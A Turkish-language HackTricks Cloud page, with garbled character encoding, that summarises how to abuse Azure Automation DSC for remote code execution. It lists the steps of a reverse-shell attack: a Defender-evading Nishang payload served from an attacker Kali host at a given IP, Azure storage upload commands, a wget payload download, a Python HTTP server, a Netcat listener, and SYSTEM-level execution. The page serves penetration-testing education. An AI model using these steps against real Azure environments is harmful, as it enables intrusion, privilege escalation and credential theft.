# Az - Durum YapÄ±landÄ±rmasÄ± Uzaktan Kod YÃ¼rÃ¼tme (RCE)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

**Tam yazÄ±yÄ± buradan kontrol edin: [https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### Uzaktan Sunucu (C2) AltyapÄ±sÄ± HazÄ±rlama ve AdÄ±mlarÄ±nÄ±n Ã–zeti

#### Genel BakÄ±ÅŸ
Bu sÃ¼reÃ§, Windows Defender'Ä± atlatan deÄŸiÅŸtirilmiÅŸ bir Nishang `Invoke-PowerShellTcp.ps1` yÃ¼kÃ¼nÃ¼ barÄ±ndÄ±rmak iÃ§in uzaktan bir sunucu altyapÄ±sÄ± kurmayÄ± iÃ§erir. YÃ¼k, `40.84.7.74` IP'li bir Kali Linux makinesinden basit bir Python HTTP sunucusu kullanÄ±larak sunulur. Ä°ÅŸlem, aÅŸaÄŸÄ±daki adÄ±mlarla gerÃ§ekleÅŸtirilir:

#### AdÄ±m 1 â€” DosyalarÄ± OluÅŸturma
- **Gerekli Dosyalar:** Ä°ki PowerShell komut dosyasÄ± gereklidir:
1. `reverse_shell_config.ps1`: YÃ¼kÃ¼ alÄ±p yÃ¼rÃ¼ten bir Desired State Configuration (DSC) dosyasÄ±dÄ±r. [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1) Ã¼zerinden elde edilebilir.
2. `push_reverse_shell_config.ps1`: YapÄ±landÄ±rmayÄ± sanal makineye yayÄ±mlayan bir komut dosyasÄ±dÄ±r. [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1) Ã¼zerinde bulunur.
- **Ã–zelleÅŸtirme:** Bu dosyalardaki deÄŸiÅŸkenler ve parametreler, kullanÄ±cÄ±nÄ±n belirli ortamÄ±na gÃ¶re uyarlanmalÄ±dÄ±r. Bu, kaynak adlarÄ±, dosya yollarÄ± ve sunucu/yÃ¼k tanÄ±mlayÄ±cÄ±larÄ± gibi unsurlarÄ± iÃ§erir.

#### AdÄ±m 2 â€” YapÄ±landÄ±rma DosyasÄ±nÄ± SÄ±kÄ±ÅŸtÄ±rma
- `reverse_shell_config.ps1` dosyasÄ± `.zip` formatÄ±na sÄ±kÄ±ÅŸtÄ±rÄ±lÄ±r ve Azure Depolama HesabÄ±na transfer iÃ§in hazÄ±r hale getirilir.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### AdÄ±m 3 â€” Depolama BaÄŸlamÄ±nÄ± Ayarla ve YÃ¼kle
- SÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ yapÄ±landÄ±rma dosyasÄ±, Azure'nin Set-AzStorageBlobContent komut dosyasÄ±nÄ± kullanarak Ã¶nceden tanÄ±mlanmÄ±ÅŸ bir Azure Depolama kabÄ±na, azure-pentest'e yÃ¼klenir.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### AdÄ±m 4 â€” Kali Box'Ä± HazÄ±rlama
- Kali sunucusu, RevPS.ps1 yÃ¼kÃ¼nÃ¼ bir GitHub deposundan indirir.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- AdÄ±m 5 â€” YapÄ±landÄ±rma DosyasÄ±nÄ± YayÄ±mla
- YapÄ±landÄ±rma dosyasÄ± Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r ve ters kabuk betiÄŸi belirtilen konuma Windows VM Ã¼zerine daÄŸÄ±tÄ±lÄ±r.

#### AdÄ±m 6 â€” YÃ¼kÃ¼ BarÄ±ndÄ±r ve Dinleyiciyi Kur
- Bir Python SimpleHTTPServer, yÃ¼kÃ¼ barÄ±ndÄ±rmak iÃ§in baÅŸlatÄ±lÄ±r ve gelen baÄŸlantÄ±larÄ± yakalamak iÃ§in bir Netcat dinleyicisi kurulur.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- ZamanlanmÄ±ÅŸ gÃ¶rev, payload'Ä± Ã§alÄ±ÅŸtÄ±rarak SYSTEM dÃ¼zeyinde ayrÄ±calÄ±klar elde eder.

#### SonuÃ§

Bu sÃ¼recin baÅŸarÄ±lÄ± bir ÅŸekilde gerÃ§ekleÅŸtirilmesi, kimlik bilgilerinin Ã§alÄ±nmasÄ± veya saldÄ±rÄ±nÄ±n birden fazla sanal makineye yayÄ±lmasÄ± gibi birÃ§ok olasÄ±lÄ±ÄŸÄ± beraberinde getirir. KÄ±lavuz, Azure Automation DSC alanÄ±nda sÃ¼rekli Ã¶ÄŸrenmeyi ve yaratÄ±cÄ±lÄ±ÄŸÄ± teÅŸvik eder.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin.
* Ã–zel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin.
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
